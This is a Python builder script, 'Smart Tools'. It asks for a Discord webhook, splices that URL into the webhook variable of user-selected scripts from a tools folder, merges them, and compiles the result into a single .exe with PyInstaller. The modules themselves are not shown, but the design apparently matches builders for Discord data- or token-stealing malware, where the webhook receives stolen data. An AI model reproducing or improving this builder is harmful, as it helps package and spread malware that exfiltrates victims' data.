import os
import re
import shutil
import subprocess

TOOLS_DIRECTORY = "tools"
SCRIPTS_DIRECTORY = "scripts"
OUTPUT_DIRECTORY = "output"
CREDITS = "Altay702"


def print_centered(text, width=50):
    """Print text centered within a given width."""
    print(text.center(width))


def ask_for_webhook():
    """Prompt the user for a Discord webhook URL."""
    while True:
        print_centered("Enter your Discord Webhook URL:")
        webhook = input("".center(50)).strip()
        if not webhook:
            return "https://discord.com/api/webhooks/123456789012345678/fakewebhooktoken"
        elif re.match(r"^https://discord.com/api/webhooks/\d+/[A-Za-z0-9-_]+$", webhook):
            return webhook
        else:
            print_centered("Invalid webhook URL. Please try again.")


def select_scripts():
    """Prompt the user to select scripts from the `tools` directory."""
    available_scripts = [f for f in os.listdir(TOOLS_DIRECTORY) if f.endswith(".py")]
    if not available_scripts:
        print_centered("No scripts found in the tools directory!")
        return []

    print("\n" + "=" * 50)
    print_centered("Available Scripts:")
    for i, script in enumerate(available_scripts, start=1):
        print_centered(f"{i}. {script}")
    print_centered("Enter the numbers of scripts you want to include (e.g., 1,2,3).")
    print("=" * 50)

    choice = input("".center(50)).strip()
    try:
        selected_scripts = [
            available_scripts[int(i) - 1] for i in choice.split(",") if i.isdigit()
        ]
        return selected_scripts
    except (IndexError, ValueError):
        print_centered("Invalid selection. Please try again.")
        return []


def replace_webhook_in_script(script_path, webhook):
    """Insert the webhook into the given script."""
    with open(script_path, "r", encoding="utf-8") as file:
        content = file.read()

    updated_content = re.sub(
        r"(webhook\s*=\s*['\"])(.*?)(['\"])",
        rf"\1{webhook}\3",
        content,
    )
    return updated_content


def combine_scripts(selected_scripts, webhook):
    """Combine selected scripts into a single Python file."""
    if not os.path.exists(OUTPUT_DIRECTORY):
        os.makedirs(OUTPUT_DIRECTORY)

    combined_file = os.path.join(OUTPUT_DIRECTORY, "combined_tool.py")
    with open(combined_file, "w", encoding="utf-8") as outfile:
        for script in selected_scripts:
            script_path = os.path.join(TOOLS_DIRECTORY, script)
            if os.path.exists(script_path):
                content = replace_webhook_in_script(script_path, webhook)
                outfile.write(f"# Start of {script} - Credits: {CREDITS}\n")
                outfile.write(content)
                outfile.write(f"\n# End of {script}\n\n")
    print_centered(f"Combined script created: {combined_file}")
    return combined_file


def build_exe(py_file):
    """Compile the combined script into an .exe using PyInstaller."""
    dist_dir = os.path.join(OUTPUT_DIRECTORY, "dist")
    if os.path.exists(dist_dir):
        shutil.rmtree(dist_dir)

    exe_name = input("Enter the name for the .exe file: ".center(50)).strip()
    subprocess.run(
        ["pyinstaller", "--onefile", "--distpath", OUTPUT_DIRECTORY, "--name", exe_name, py_file],
        check=True,
    )
    print_centered(f"Executable created: {os.path.join(OUTPUT_DIRECTORY, exe_name)}.exe")


def use_tools():
    """Allow the user to run tools from the `scripts` directory."""
    available_tools = [f for f in os.listdir(SCRIPTS_DIRECTORY) if f.endswith(".py")]
    if not available_tools:
        print_centered("No tools found in the scripts directory!")
        return

    print("\n" + "=" * 50)
    print_centered("Available Tools:")
    for i, tool in enumerate(available_tools, start=1):
        print_centered(f"{i}. {tool}")
    print("=" * 50)

    choice = input("Choose a tool to run (e.g., 1): ".center(50)).strip()
    try:
        selected_tool = available_tools[int(choice) - 1]
        tool_path = os.path.join(SCRIPTS_DIRECTORY, selected_tool)
        os.system(f"python {tool_path}")
    except (IndexError, ValueError):
        print_centered("Invalid choice. Exiting.")


def main():
    print("\n" * 7)
    print_centered("Welcome to Smart Tools")
    print_centered(f"Credits: {CREDITS}")
    print("=" * 50)
    print_centered("1. Build File")
    print_centered("2. Use Tools")
    print_centered("3. Exit")
    print("=" * 50)

    choice = input("Enter your choice: ".center(50)).strip()
    if choice == "1":
        webhook = ask_for_webhook()
        selected_scripts = select_scripts()
        if selected_scripts:
            combined_file = combine_scripts(selected_scripts, webhook)
            build_choice = input("Do you want to build an .exe? (y/n): ".center(50)).strip().lower()
            if build_choice == "y":
                build_exe(combined_file)
    elif choice == "2":
        use_tools()
    elif choice == "3":
        print_centered("Exiting. Goodbye!")
    else:
        print_centered("Invalid choice. Please try again.")


if __name__ == "__main__":
    main()
